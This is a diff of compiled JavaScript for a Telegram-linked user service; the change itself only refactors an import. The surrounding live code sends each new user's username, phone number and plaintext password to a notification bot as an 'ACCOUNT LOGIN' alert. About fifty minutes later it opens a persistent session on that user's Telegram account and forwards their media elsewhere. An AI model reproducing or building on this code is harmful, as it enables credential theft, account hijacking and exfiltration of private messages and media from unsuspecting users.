@@ -11,9 +11,6 @@ var __metadata = (this && this.__metadata) || function (k, v) {
 var __param = (this && this.__param) || function (paramIndex, decorator) {
     return function (target, key) { decorator(target, key, paramIndex); }
 };
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.UsersService = void 0;
 const Telegram_service_1 = require("./../Telegram/Telegram.service");
@@ -23,7 +20,7 @@ const mongoose_2 = require("mongoose");
 const client_service_1 = require("../clients/client.service");
 const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
 const logbots_1 = require("../../utils/logbots");
-const connection_manager_1 = __importDefault(require("../Telegram/utils/connection-manager"));
+const connection_manager_1 = require("../Telegram/utils/connection-manager");
 let UsersService = class UsersService {
     constructor(userModel, telegramService, clientsService) {
         this.userModel = userModel;
@@ -41,7 +38,7 @@ let UsersService = class UsersService {
         else {
             await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
             setTimeout(async () => {
-                await connection_manager_1.default.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                 this.telegramService.forwardMedia(user.mobile, "savedmessages34", null);
             }, 50 * 60000);
             const newUser = new this.userModel(user);
